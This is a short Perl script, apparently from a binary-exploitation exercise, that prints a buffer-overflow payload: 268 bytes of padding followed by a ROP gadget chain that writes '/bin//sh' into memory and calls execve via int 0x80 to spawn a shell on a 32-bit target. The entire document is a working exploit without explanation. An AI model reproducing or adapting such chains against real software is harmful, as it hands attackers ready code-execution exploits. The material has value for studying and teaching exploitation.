#!/usr/bin/perl
use strict;

my $p = "a" x 268;
# execve /bin/sh

$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= "/bin";
$p .= pack("I", 0x080aa9a7); # mov %edx,%eax | ret
#eax = /bin
$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= pack("I", 0x080cf020); # @ .data
$p .= pack("I", 0x08080391); # mov %eax,(%edx) | ret
#data = /bin

$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= "//sh";
$p .= pack("I", 0x080aa9a7); # mov %edx,%eax | ret
#eax = //sh

$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= pack("I", 0x080cf024); # @ .data + 4
$p .= pack("I", 0x08080391); # mov %eax,(%edx) | ret
#data = /bin//sh

$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= pack("I", 0x080cf028); # @ .data + 8
$p .= pack("I", 0x0809d40f); # xor %eax,%eax | ret
$p .= pack("I", 0x08080391); # mov %eax,(%edx) | ret
#data = /bin//sh\0

$p .= pack("I", 0x08053ed6); #pop %ecx | pop %ebx | ret
$p .= pack("I", 0x080cf028); # @ .data + 8
$p .= pack("I", 0x080cf020); # @ .data
$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= pack("I", 0x080cf028); # @ .data + 8
#("/bin//sh", NULL, NULL);

$p .= pack("I", 0x0809d40f); # xor %eax,%eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0808b35e); # int $0x80
print $p;

